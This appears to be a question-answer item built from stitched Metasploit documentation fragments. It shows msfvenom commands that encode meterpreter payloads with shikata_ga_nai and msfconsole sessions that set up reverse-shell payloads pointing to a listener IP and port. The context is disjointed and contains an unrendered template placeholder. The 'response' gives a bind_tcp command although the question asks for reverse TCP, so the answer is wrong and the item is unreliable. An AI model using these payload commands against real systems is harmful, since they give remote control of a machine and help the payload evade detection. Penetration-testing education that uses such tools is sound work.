Context:```
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 
```

# How to encode a payload
By default, the encoding feature will automatically kick in when you use the -b flag (the badchar flag). In other cases, you must use the -e flag like the following:
```
./msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw
```

To find out what encoders you can use, you can use the -l flag:
## Using the Pivot
At this point we can now use the pivot with any Metasploit modules as shown below:
```msf
msf6 > use payload/windows/x64/meterpreter/reverse_tcp
smsf6 payload(windows/x64/meterpreter/reverse_tcp) > set lhost 172.19.182.171
lhost => 172.19.182.171
msf6 payload(windows/x64/meterpreter/reverse_tcp) > set lport 4578
lport => 4578
msf6 payload(windows/x64/meterpreter/reverse_tcp) > to_handler
[*] Payload Handler Started as Job 0
### Payloads modules ({{ site.metasploit_module_counts["payload"] }})
Payload modules can also be used individually to generate standalone executables, or shellcode for use within exploits:
```msf
msf6 payload(linux/x86/shell_reverse_tcp) > back
msf6 > use payload/linux/x86/shell_reverse_tcp
msf6 payload(linux/x86/shell_reverse_tcp) > set lhost 127.0.0.1
lhost => 127.0.0.1
msf6 payload(linux/x86/shell_reverse_tcp) > set lport 4444
lport => 4444

 Question: Provide a Metasploit command using msfvenom to generate a reverse TCP payload that includes the shikata_ga_nai encoding strategy. Respond with only the msfvenom command, without any additional output or explanation. 

 Your response: 
```
./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
```